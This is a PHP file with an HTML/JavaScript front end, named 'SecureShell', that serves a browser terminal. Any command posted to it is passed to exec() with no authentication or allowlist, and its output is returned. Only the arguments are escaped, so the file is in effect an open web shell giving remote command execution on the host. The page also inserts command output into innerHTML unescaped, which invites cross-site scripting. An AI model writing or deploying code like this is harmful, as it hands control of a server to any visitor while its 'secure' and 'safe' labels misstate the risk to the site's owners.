<?php

function log_action($message) {
    $log_file = __DIR__ . '/shell_log.txt';
    $timestamp = date('Y-m-d H:i:s');
    file_put_contents($log_file, "[$timestamp] $message\n", FILE_APPEND);
}


function safe_execute_command($command) {

    $parts = explode(' ', $command);
    $base_command = $parts[0];

    $args = array_slice($parts, 1);
    $escaped_args = array_map('escapeshellarg', $args);
    $full_command = $base_command . ' ' . implode(' ', $escaped_args);

    $output = [];
    $return_var = 0;
    exec($full_command, $output, $return_var);

    if ($return_var !== 0) {
        return "Command failed with error code: $return_var";
    }

    return implode("\n", $output);
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    header('Content-Type: application/json');

    $input = file_get_contents('php://input');
    $data = json_decode($input, true);


    if (!isset($data['command'])) {
        echo json_encode(['error' => 'No command provided']);
        exit;
    }

    $command = trim($data['command']);

    log_action("Executing command: $command");

    $result = safe_execute_command($command);

    echo json_encode([
        'success' => true,
        'command' => $command,
        'output' => $result,
        'timestamp' => date('Y-m-d H:i:s')
    ]);
    exit;
}
?>
<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SecureShell</title>
    <style>
        body {
            background-color: #000;
			color: white;
            font-family: 'Consolas', 'Monaco', monospace;
            margin: 0;
            padding: 20px;
        }
        #terminal {
            /* width: 100%;
            height: 400px;
            border: 1px solid #0f0;
            overflow-y: auto;
            padding: 10px;
            box-sizing: border-box;
            background-color: #000; */
        }
        #cmd-input {
            width: 100%;
            padding: 8px;
            margin-top: 10px;
            background-color: #111;
			color: white;
            border: 1px solid white;
            box-sizing: border-box;
        }
        .prompt {
            color: #0ff;
        }
    </style>
</head>
<body>
    <div id="terminal">
        <!-- <div class="prompt">Welcome to SecureShell. Type 'help' for available commands.</div> -->
		 <div class="prompt">Commands: </div>
    </div>
    <br>
    <input type="text" id="cmd-input" placeholder="Enter command (press Enter)">
    <button onclick="sendCommand()">Execute</button>
    <script>
		// const cmd = document.getElementById("cmd-input");
		// cmd.onkeypress = function (e) {
		// 	if (e.key == "Enter") {
		// 		sendCommand()
		// 	}
		// }
		
        function addOutput(text) {
            const terminal = document.getElementById('terminal');
            terminal.innerHTML += '<br>' + text;
            terminal.scrollTop = terminal.scrollHeight;
        }

        function sendCommand() {
            const cmdInput = document.getElementById('cmd-input');
            const command = cmdInput.value.trim();

            if (!command) return;

            // Добавляем команду в терминал
            addOutput('<span class="prompt">$</span> ' + command);

            // Отправляем запрос
            fetch('<?php echo $_SERVER['SCRIPT_NAME']; ?>', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    command: command
                })
            })
            .then(response => response.json())
            .then(data => {
                if (data.error) {
                    addOutput('<span style="color: #f00;">Error: ' + data.error + '</span>');
                } else {
                    addOutput(data.output || 'No output');
                }
            })
            .catch(error => {
                addOutput('<span style="color: #f00;">Network error: ' + error + '</span>');
            });

            cmdInput.value = '';
        }

        document.getElementById('cmd-input').addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                sendCommand();
            }
        });
    </script>
</body>
</html>
